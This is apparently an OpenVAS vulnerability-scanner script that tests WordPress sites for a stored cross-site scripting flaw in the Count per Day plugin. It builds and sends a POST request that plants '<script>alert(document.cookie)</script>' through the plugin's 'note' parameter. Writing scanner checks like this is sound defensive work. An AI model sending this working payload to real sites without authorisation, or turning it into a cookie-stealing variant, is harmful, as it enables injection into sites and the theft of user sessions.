###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_wordpress_count_per_day_plugin_stored_xss_vuln.nasl 7572 2017-10-26 08:08:35Z cfischer $
#
# WordPress Count per Day Plugin 'note' Parameter Persistent XSS Vulnerability
#
# Authors:
# Rachana Shetty <srachana@secpod.com>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_impact = "Successful exploitation will allow remote attackers to insert
arbitrary HTML and script code, which will be executed in a user's browser
session in the context of an affected site.

Impact Level: Application";

tag_affected = "WordPress Count per Day Plugin version 3.2.3 and prior";

tag_insight = "The input passed via 'note' parameter to
'/wp-content/plugins/count-per-day/notes.php' script is not properly
validated, which allows attackers to execute arbitrary HTML and script code
in a user's browser session in the context of an affected site.";

tag_solution = "Upgrade to version 3.2.4 or later,
For updates refer to http://wordpress.org/extend/plugins/count-per-day";

tag_summary = "This host is running WordPress with Count per Day plugin and is
prone to cross site scripting vulnerability.";

CPE = "cpe:/a:wordpress:wordpress";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.803009");
  script_version("$Revision: 7572 $");
  script_bugtraq_id(55231);
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"last_modification", value:"$Date: 2017-10-26 10:08:35 +0200 (Thu, 26 Oct 2017) $");
  script_tag(name:"creation_date", value:"2012-08-28 12:46:18 +0530 (Tue, 28 Aug 2012)");
  script_name("WordPress Count per Day Plugin 'note' Parameter Persistent XSS Vulnerability");
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/20862/");
  script_xref(name : "URL" , value : "http://packetstormsecurity.org/files/115904/WordPress-Count-Per-Day-3.2.3-Cross-Site-Scripting.html");

  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_copyright("This script is Copyright (C) 2012 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("secpod_wordpress_detect_900182.nasl");
  script_mandatory_keys("wordpress/installed");
  script_require_ports("Services/www", 80);
  script_tag(name : "impact" , value : tag_impact);
  script_tag(name : "affected" , value : tag_affected);
  script_tag(name : "insight" , value : tag_insight);
  script_tag(name : "solution" , value : tag_solution);
  script_tag(name : "summary" , value : tag_summary);
  exit(0);
}

include("http_func.inc");
include("version_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

## Variable Initialization
port = 0;
host = "";
dir = "";
url = "";
cdReq = "";
cdRes = "";
postdata = "";

if(!port = get_app_port(cpe:CPE)){
  exit(0);
}

if(!dir = get_app_location(cpe:CPE, port:port)){
  exit(0);
}

host = http_host_name(port:port);

## Construct the request to Access notes.php
url = dir + '/wp-content/plugins/count-per-day/notes.php';

## Try to access and check the response to confirm if its accessible
if(http_vuln_check(port:port, url:url, check_header:TRUE,
       pattern:"<title>CountPerDay"))
{
  ## Construct the POST data
  postdata = 'month=8&year=2012&date=2012-08-28&note=<script>' +
             'alert(document.cookie)</script>&new=%2B';

  ## Construct the POST request
  cdReq = string("POST ", url, " HTTP/1.1\r\n",
                 "Host: ", host, "\r\n",
                 "User-Agent: ", OPENVAS_HTTP_USER_AGENT, "\r\n",
                 "Content-Type: application/x-www-form-urlencoded\r\n",
                 "Content-Length: ", strlen(postdata), "\r\n",
                 "\r\n", postdata);

  ## Send attack and receive the response
  cdRes = http_keepalive_send_recv(port:port, data: cdReq);

  ## Confirm exploit worked by checking the response
  if(cdRes && cdRes =~ "HTTP/1\.[0-9]+ 200" &&
     "<title>CountPerDay" >< cdRes &&
     "<script>alert(document.cookie)</script>" >< cdRes){
    security_message(port);
  }
}
